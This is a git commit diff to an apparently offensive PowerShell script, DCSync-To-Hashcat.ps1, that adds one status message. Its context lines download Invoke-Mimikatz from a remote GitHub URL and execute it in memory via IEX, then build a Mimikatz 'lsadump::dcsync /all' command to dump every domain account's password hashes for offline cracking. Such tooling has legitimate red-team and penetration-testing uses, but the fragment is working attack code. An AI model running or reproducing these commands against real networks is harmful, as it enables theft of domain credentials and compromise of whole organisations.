89876e2a0a1622b69d3dc1326c0ad9495a157b84
ViperOne <68926315+The-Viper-One@users.noreply.github.com>
2023-03-04 17:09:24 +0000

    Update DCSync-To-Hashcat.ps1

--- DCSync-To-Hashcat.ps1
+++ DCSync-To-Hashcat.ps1
@@ -14,6 +14,7 @@ Write-Host "[-] Downloading Mimikatz into Memory" -ForegroundColor Cyan
 IEX(new-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BC-SECURITY/Empire/master/empire/server/data/module_source/credentials/Invoke-Mimikatz.ps1')
 
 Write-Host "[-] DCSync will be executed again the Domain: $Domain" -ForegroundColor Cyan
+Write-Host "[-] Only User accounts will be extracted" -ForegroundColor Cyan
 
 Write-Host "[!] Executing Mimikatz" -ForegroundColor Yellow
 $Command = '"log ' + $LOGFILE + '" "lsadump::dcsync /domain:'+ $domain +' /all /csv"'
